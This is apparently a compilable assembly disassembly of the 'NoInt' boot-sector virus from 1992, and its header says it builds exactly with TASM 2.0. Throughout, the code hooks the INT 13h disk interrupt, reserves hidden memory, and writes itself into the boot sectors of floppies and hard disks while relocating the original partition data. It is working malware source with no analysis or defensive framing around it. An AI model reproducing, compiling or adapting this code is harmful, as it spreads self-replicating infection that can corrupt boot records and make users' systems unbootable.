

;        NoInt Virus, Compilable disassembly.
;
; Note that this will compile EXACTLY with TASM 2.0.
; It my need to be cleaned a bit for other assemblers.
;

PAGE  59,132

;ÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛ
;ÛÛ                                                                      ÛÛ
;ÛÛ                             NOINT                                    ÛÛ
;ÛÛ                                                                      ÛÛ
;ÛÛ      Created:   7-Dec-92                                             ÛÛ
;ÛÛ      Version:                                                        ÛÛ
;ÛÛ      Passes:    5          Analysis Options on: QRS                  ÛÛ
;ÛÛ                                                                      ÛÛ
;ÛÛ                                                                      ÛÛ
;ÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛ

data_1e         equ     4Ch                     ; (0000:004C=510h)
data_2e         equ     413h                    ; (0000:0413=280h)
data_3e         equ     600h                    ; (0000:0600=42h)
data_4e         equ     8050h                   ; (0000:8050=0)
data_5e         equ     8Ch                     ; (07C0:008C=0)
data_6e         equ     0ABh                    ; (07C0:00AB=0)
data_7e         equ     10Ch                    ; (07C0:010C=0)
data_8e         equ     10Eh                    ; (07C0:010E=0)
data_9e         equ     3                       ; (3A72:0003=0)
data_10e        equ     0D6h                    ; (3A72:00D6=0)
data_18e        equ     3BEh                    ; (3A72:03BE=0)

seg_a           segment byte public
		assume  cs:seg_a, ds:seg_a


		org     100h

noint           proc    far

start:
;*              jmp     short loc_4             ;*(013E)
		db      0EBh, 3Ch
		nop
		mov     ss,ax
		mov     sp,7C00h
		mov     si,sp
		push    ax
		pop     es
		push    ax
		pop     ds
		sti                             ; Enable interrupts
		cld                             ; Clear direction
		mov     di,data_3e              ; (0000:0600=42h)
		mov     cx,100h
		repne   movsw                   ; Rep zf=0+cx >0 Mov [si] to es:[di]
;*              jmp     far ptr loc_1           ;*(0000:061D)
		db      0EAh, 1Dh, 06h, 00h, 00h
		db      0BEh,0BEh, 07h,0B3h
data_12         db      4                       ;  xref 3A72:01FC
loc_2:                                          ;  xref 3A72:0131
		cmp     byte ptr [si],80h
		je      loc_3                   ; Jump if equal
		cmp     byte ptr [si],0
		jne     $+1Eh                   ; Jump if not equal
		add     si,10h
		dec     bl
		jnz     loc_2                   ; Jump if not zero
		int     18h                     ; ROM basic
loc_3:                                          ;  xref 3A72:0125
		mov     dx,[si]
		mov     cx,[si+2]
		mov     bp,si
		add     si,0FFFAh
		xor     ax,ax                   ; Zero register
		mov     ds,ax
		mov     sp,ax
		mov     ax,7C0h
		mov     ss,ax
		sti                             ; Enable interrupts
		mov     ax,ds:data_1e           ; (0000:004C=510h)
		mov     ss:data_7e,ax           ; (07C0:010C=0)
		mov     ax,word ptr ds:[4Eh]    ; (0000:004E=299h)
		mov     ss:data_8e,ax           ; (07C0:010E=0)
		mov     ax,ds:data_2e           ; (0000:0413=280h)
		mov     ss:data_6e,ax           ; (07C0:00AB=0)
		dec     ax
		dec     ax
		mov     ds:data_2e,ax           ; (0000:0413=280h)
		mov     cl,6
		shl     ax,cl                   ; Shift w/zeros fill
		mov     es,ax
		mov     ss:data_5e,ax           ; (07C0:008C=0)
		mov     ax,0DAh
		mov     ds:data_1e,ax           ; (0000:004C=510h)
		mov     word ptr ds:[4Eh],es    ; (0000:004E=299h)
		mov     cx,200h
		push    ss
		pop     ds
		xor     si,si                   ; Zero register
		mov     di,si
		cld                             ; Clear direction
		rep     movsb                   ; Rep when cx >0 Mov [si] to es:[di]
		jmp     dword ptr ss:[8Ah]      ; (07C0:008A=0)
		mov     es,[bx+si]
		sbb     byte ptr ds:[0D08Ch][bx],8Eh    ; (07C0:D08C=0AAh)
		db      0C0h,0B8h, 01h, 02h, 33h,0DBh
		db      0F6h,0C2h, 80h, 74h, 11h,0B9h
		db       07h, 00h,0BAh, 80h, 00h, 9Ch
		db       2Eh,0FFh, 1Eh, 0Ch, 01h,0EBh
		db       16h, 90h, 80h, 02h,0B9h, 03h
		db       00h,0BAh, 00h, 01h, 9Ch, 2Eh
		db      0FFh, 1Eh, 0Ch, 01h, 72h, 05h
		db      0B2h, 80h,0E8h
data_13         db      62h                     ;  xref 3A72:026B
		db      0
loc_5:
		xor     ax,ax                   ; Zero register
		mov     ds,ax
		mov     es,ax
		mov     ss,ax
		mov     sp,400h
		xor     bx,bx                   ; Zero register
		xor     cx,cx                   ; Zero register
		xor     dx,dx                   ; Zero register
		jmp     dword ptr cs:data_10e   ; (3A72:00D6=0)
		db      00,7Ch,00,00,1Eh,50h,80h,0FCh
		;add     [si+0],bh
		;add     ds:data_4e,bl           ; (0000:8050=0)
		;cld                             ; Clear direction
		add     dh,[di+39h]
		cmp     dx,80h
		jne     loc_6                   ; Jump if not equal
		cmp     cx,1
		jne     loc_6                   ; Jump if not equal
		push    cx
		mov     cx,7
		mov     ax,201h
		pushf                           ; Push flags
		call    dword ptr cs:[10Ch]     ; (3A72:010C=1F50h)
		pop     cx
		jc      loc_8                   ; Jump if carry Set
		mov     cs:data_12,ah           ; (3A72:0121=4)
		pop     ax
		pop     ds
		push    bp
		mov     bp,sp
		and     byte ptr [bp+6],0FEh
		pop     bp
		iret                            ; Interrupt return
		db       8Ah, 0Bh, 00h,0C8h
loc_6:                                          ;  xref 3A72:01E5, 01EA
		cmp     dx,1
		ja      loc_7                   ; Jump if above
		call    sub_1                   ; (0222)
		jc      loc_7                   ; Jump if carry Set
loc_7:                                          ;  xref 3A72:0213, 0218
		pop     ax
		pop     ds
loc_8:                                          ;  xref 3A72:01FA
		jmp     dword ptr cs:[10Ch]     ; (3A72:010C=1F50h)
		db      0

noint           endp

;ßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßß
;                              SUBROUTINE
;
;         Called from:   3A72:0215
;ÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜ

sub_1           proc    near
		push    bx
		push    cx
		push    dx
		push    si
		push    di
		push    es
		mov     si,2
loc_9:                                          ;  xref 3A72:0249
		mov     ax,201h
		mov     cx,1
		mov     bx,200h
		push    cs
		pop     es
		xor     dh,dh                   ; Zero register
		pushf                           ; Push flags
		call    dword ptr cs:[10Ch]     ; (3A72:010C=1F50h)
		jnc     loc_10                  ; Jump if carry=0
		xor     ax,ax                   ; Zero register
		pushf                           ; Push flags
		call    dword ptr cs:[10Ch]     ; (3A72:010C=1F50h)
		dec     si
		jnz     loc_9                   ; Jump if not zero
		stc                             ; Set carry flag
		jmp     short loc_12            ; (029F)
		db      90h
loc_10:                                         ;  xref 3A72:023E
		mov     si,data_10e             ; (3A72:00D6=0)
		push    cs
		pop     ds
		mov     ax,[si]
		cmp     ax,word ptr ds:[200h][si]       ; (3A72:0200=5801h)
		je      loc_12                  ; Jump if equal
		mov     di,data_9e              ; (3A72:0003=0)
		mov     si,offset ds:[203h]     ; (3A72:0203=55h)
		mov     cx,3Bh
		cld                             ; Clear direction
		rep     movsb                   ; Rep when cx >0 Mov [si] to es:[di]
		mov     si,data_18e             ; (3A72:03BE=0)
		mov     di,offset data_13       ; (3A72:01BE=62h)
		mov     cx,42h
		rep     movsb                   ; Rep when cx >0 Mov [si] to es:[di]
		mov     ax,301h
		mov     bx,200h
		mov     cx,3
		mov     dh,1
		cmp     dl,1
		jbe     loc_11                  ; Jump if below or =
		mov     cx,7
		xor     dh,dh                   ; Zero register
loc_11:                                         ;  xref 3A72:0281
		pushf                           ; Push flags
		call    dword ptr cs:[10Ch]     ; (3A72:010C=1F50h)
		jc      loc_12                  ; Jump if carry Set
		mov     ax,301h
		xor     bx,bx                   ; Zero register
		xor     dh,dh                   ; Zero register
		mov     cl,1
		pushf                           ; Push flags
		call    dword ptr cs:[10Ch]     ; (3A72:010C=1F50h)
loc_12:                                         ;  xref 3A72:024C, 025A, 028E
		pop     es
		pop     di
		pop     si
		pop     dx
		pop     cx
		pop     bx
		retn
sub_1           endp

		db      0FCh,0FCh
		db      22 dup (0)
		db       80h, 01h, 01h, 00h, 06h, 04h
		db       9Fh,0DBh, 1Fh, 00h, 00h, 00h
		db       15h,0BBh, 01h, 00h
		db      48 dup (0)
		db       55h,0AAh

seg_a           ends



		end     start

±±±±±±±±±±±±±±±±±±±± CROSS REFERENCE - KEY ENTRY POINTS ±±±±±±±±±±±±±±±±±±±

    seg:off    type        label
   ---- ----   ----   ---------------
   3A72:0100   far    start

 ±±±±±±±±±±±±±±±±±± Interrupt Usage Synopsis ±±±±±±±±±±±±±±±±±±

	Interrupt 18h : ROM basic

 ±±±±±±±±±±±±±±±±±± I/O Port Usage Synopsis  ±±±±±±±±±±±±±±±±±±

	No I/O ports used.


